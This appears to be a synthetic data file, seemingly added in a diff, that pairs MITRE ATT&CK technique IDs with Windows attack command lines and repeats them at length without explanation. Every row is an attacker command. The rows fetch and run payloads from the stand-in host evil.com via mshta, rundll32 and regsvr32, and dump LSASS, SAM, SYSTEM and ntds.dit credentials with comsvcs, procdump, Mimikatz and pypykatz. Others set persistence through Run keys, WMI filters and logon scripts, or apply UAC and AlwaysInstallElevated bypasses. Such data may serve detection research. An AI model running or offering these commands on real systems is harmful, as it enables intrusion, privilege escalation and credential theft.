+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""payload_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,arp -a
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""payload.exe"" /f"
+T1129,dotnet test.dll
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,vssadmin create shadow /for=C:
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v test /d ""rundll32.exe test.dll,EntryPoint"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/test.sct"")"
+T1016,netsh interface show interface
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,net localgroup administrators
+T1003,vssadmin create shadow /for=C:
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\update_cache.dll,Run"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,route print
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\test.dll')
+T1087,net user /domain backup_user
+T1003,vssadmin create shadow /for=C:
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v test /d ""rundll32.exe test.dll,EntryPoint"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,netsh interface show interface
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,dnx.exe update_cache.dll
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_cache_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,arp -a
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\svc_helper.dll')
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,pypykatz lsa minidump svc_helper.dmp
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v svc_helper /d ""rundll32.exe svc_helper.dll,EntryPoint"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/svc_helper.sct"")"
+T1016,route print
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""svc_helper.exe"" /f"
+T1129,Import-Module -Name 'C:\Windows\Temp\sys_drv.dll' -Function *
+T1087,net localgroup administrators
+T1003,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 3248 C:\Windows\Temp\lsass.dmp full"
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\sys_drv.dll,Run"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,netsh interface show interface
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,"rundll32.exe test.dll, Execute"
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,esentutl.exe /y /v /ss C:\Windows\ntds\ntds.dit /d C:\Windows\Temp\ntds.dit
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\test.dll,Run"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""test.exe"" /f"
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\update.dll')
+T1087,dsquery user -name backup_user*
+T1003,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 853 C:\Windows\Temp\lsass.dmp full"
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/update.sct"")"
+T1016,route print
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,"rundll32.exe svc_helper.dll, Execute"
+T1087,"Get-ADUser -Filter * | Select-Object Name, SamAccountName"
+T1003,reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v svc_helper /d ""rundll32.exe svc_helper.dll,EntryPoint"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,arp -a
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""svc_helper.exe"" /f"
+T1129,Import-Module -Name 'C:\Windows\Temp\test.dll' -Function *
+T1087,"Get-ADUser -Filter * | Select-Object Name, SamAccountName"
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v test /d ""rundll32.exe test.dll,EntryPoint"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/test.exe"
+T1016,netsh interface show interface
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""test.exe"" /f"
+T1129,dotnet test.dll
+T1087,quser /server:localhost
+T1003,pypykatz lsa minidump test.dmp
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\test.dll,Run"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/test.sct"")"
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,"Get-ADUser -Filter * | Select-Object Name, SamAccountName"
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,arp -a
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,Import-Module -Name 'C:\Windows\Temp\svc_helper.dll' -Function *
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""svc_helper_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""svc_helper.exe"" /f"
+T1129,"rundll32.exe sys_drv.dll, Execute"
+T1087,net user /domain backup_user
+T1003,reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""sys_drv_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\update.dll')
+T1087,dsquery user -name svc_sql*
+T1003,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1128 C:\Windows\Temp\lsass.dmp full"
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update.exe"
+T1016,netsh interface show interface
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,pypykatz lsa minidump test.dmp
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v test /d ""rundll32.exe test.dll,EntryPoint"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/test.sct"")"
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""test.exe"" /f"
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,"wmic useraccount get name,sid"
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""test_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,net user /domain admin
+T1003,procdump.exe -ma lsass.exe debug.dmp
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v debug /d ""rundll32.exe debug.dll,EntryPoint"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/debug.sct"")"
+T1016,arp -a
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,regsvr32.exe /s /u /i:http://evil.com/update_cache.sct scrobj.dll
+T1087,quser /server:localhost
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\update_cache.dll,Run"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update_cache.exe"
+T1016,route print
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,"wmic useraccount get name,sid"
+T1003,procdump.exe -ma lsass.exe payload.dmp
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""payload_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,route print
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""payload.exe"" /f"
+T1129,Import-Module -Name 'C:\Windows\Temp\update_cache.dll' -Function *
+T1087,dsquery user -name backup_user*
+T1003,reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_cache_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update_cache.exe"
+T1016,netsh interface show interface
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\test.dll,Run"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/test.exe"
+T1016,netsh interface show interface
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""test.exe"" /f"
+T1129,regsvr32.exe /s /u /i:http://evil.com/svc_helper.sct scrobj.dll
+T1087,"wmic useraccount get name,sid"
+T1003,procdump.exe -ma lsass.exe svc_helper.dmp
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""svc_helper_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,ipconfig /all
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""svc_helper.exe"" /f"
+T1129,dotnet test.dll
+T1087,net user /domain backup_user
+T1003,vssadmin create shadow /for=C:
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""test_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/test.sct"")"
+T1016,route print
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""test.exe"" /f"
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\test.dll')
+T1087,dsquery user -name it_dept*
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v test /d ""rundll32.exe test.dll,EntryPoint"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/test.sct"")"
+T1016,route print
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""test.exe"" /f"
+T1129,dotnet sys_drv.dll
+T1087,net localgroup administrators
+T1003,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1380 C:\Windows\Temp\lsass.dmp full"
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""sys_drv_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,arp -a
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll
+T1087,net user /domain admin
+T1003,procdump.exe -ma lsass.exe payload.dmp
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /d ""rundll32.exe payload.dll,EntryPoint"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/payload.exe"
+T1016,ipconfig /all
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""payload.exe"" /f"
+T1129,dotnet payload.dll
+T1087,dsquery user -name it_dept*
+T1003,pypykatz lsa minidump payload.dmp
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\payload.dll,Run"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/payload.exe"
+T1016,arp -a
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""payload.exe"" /f"
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,"wmic useraccount get name,sid"
+T1003,esentutl.exe /y /v /ss C:\Windows\ntds\ntds.dit /d C:\Windows\Temp\ntds.dit
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /d ""rundll32.exe update.dll,EntryPoint"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,arp -a
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,net localgroup administrators
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\svc_helper.dll,Run"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/svc_helper.sct"")"
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,dotnet payload.dll
+T1087,"Get-ADUser -Filter * | Select-Object Name, SamAccountName"
+T1003,vssadmin create shadow /for=C:
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""payload_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/payload.exe"
+T1016,netsh interface show interface
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,dsquery user -name it_dept*
+T1003,vssadmin create shadow /for=C:
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,route print
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\svc_helper.dll')
+T1087,quser /server:localhost
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""svc_helper_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/svc_helper.sct"")"
+T1016,netsh interface show interface
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,Import-Module -Name 'C:\Windows\Temp\svc_helper.dll' -Function *
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,vssadmin create shadow /for=C:
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\svc_helper.dll,Run"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,arp -a
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,"rundll32.exe debug.dll, Execute"
+T1087,"wmic useraccount get name,sid"
+T1003,esentutl.exe /y /v /ss C:\Windows\ntds\ntds.dit /d C:\Windows\Temp\ntds.dit
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""debug_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/debug.sct"")"
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,net localgroup administrators
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\sys_drv.dll,Run"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/sys_drv.exe"
+T1016,route print
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\sys_drv.dll')
+T1087,"Get-ADUser -Filter * | Select-Object Name, SamAccountName"
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""sys_drv_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/sys_drv.exe"
+T1016,netsh interface show interface
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\update.dll')
+T1087,"Get-ADUser -Filter * | Select-Object Name, SamAccountName"
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/update.sct"")"
+T1016,netsh interface show interface
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,"rundll32.exe test.dll, Execute"
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""test_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/test.sct"")"
+T1016,ipconfig /all
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""test.exe"" /f"
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,net user /domain it_dept
+T1003,reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""debug_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""debug.exe"" /f"
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,net localgroup administrators
+T1003,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 3271 C:\Windows\Temp\lsass.dmp full"
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\payload.dll,Run"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/payload.exe"
+T1016,netstat -ano | findstr LISTENING
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,regsvr32.exe /s /u /i:http://evil.com/test.sct scrobj.dll
+T1087,net localgroup administrators
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""test_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/test.sct"")"
+T1016,route print
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""test.exe"" /f"
+T1129,regsvr32.exe /s /u /i:http://evil.com/test.sct scrobj.dll
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,esentutl.exe /y /v /ss C:\Windows\ntds\ntds.dit /d C:\Windows\Temp\ntds.dit
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""test_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,"rundll32.exe debug.dll, Execute"
+T1087,quser /server:localhost
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\debug.dll,Run"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/debug.exe"
+T1016,route print
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""debug.exe"" /f"
+T1129,dnx.exe sys_drv.dll
+T1087,dsquery user -name backup_user*
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\sys_drv.dll,Run"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""sys_drv.exe"" /f"
+T1129,regsvr32.exe /s /u /i:http://evil.com/debug.sct scrobj.dll
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\debug.dll,Run"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,dotnet sys_drv.dll
+T1087,net user /domain it_dept
+T1003,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 4934 C:\Windows\Temp\lsass.dmp full"
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v sys_drv /d ""rundll32.exe sys_drv.dll,EntryPoint"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/sys_drv.exe"
+T1016,route print
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""sys_drv.exe"" /f"
+T1129,dotnet update.dll
+T1087,quser /server:localhost
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\update.dll,Run"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,"wmic useraccount get name,sid"
+T1003,pypykatz lsa minidump sys_drv.dmp
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v sys_drv /d ""rundll32.exe sys_drv.dll,EntryPoint"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,netsh interface show interface
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""sys_drv.exe"" /f"
+T1129,dotnet update.dll
+T1087,net user /domain admin
+T1003,reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/update.sct"")"
+T1016,netstat -ano | findstr LISTENING
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,"Get-ADUser -Filter * | Select-Object Name, SamAccountName"
+T1003,vssadmin create shadow /for=C:
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v svc_helper /d ""rundll32.exe svc_helper.dll,EntryPoint"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/svc_helper.sct"")"
+T1016,arp -a
